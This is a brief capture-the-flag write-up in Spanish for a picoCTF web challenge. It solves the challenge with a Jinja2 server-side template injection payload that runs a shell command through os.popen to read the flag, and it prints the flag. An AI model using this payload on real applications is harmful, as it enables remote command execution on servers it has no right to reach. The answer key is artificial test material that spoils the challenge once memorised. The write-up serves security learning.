# Descripción
I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:49266/)!
# Solución
Entrar a la página dada y aplicar un Server Side Template Injection para obtener la flag

- Entrar al link dado, después al ver que utiliza jinja2, solamente es escribir "{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}", con ello directamente obtenemos la flag

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}


# Notas adicionales
- 
# Referencias
- 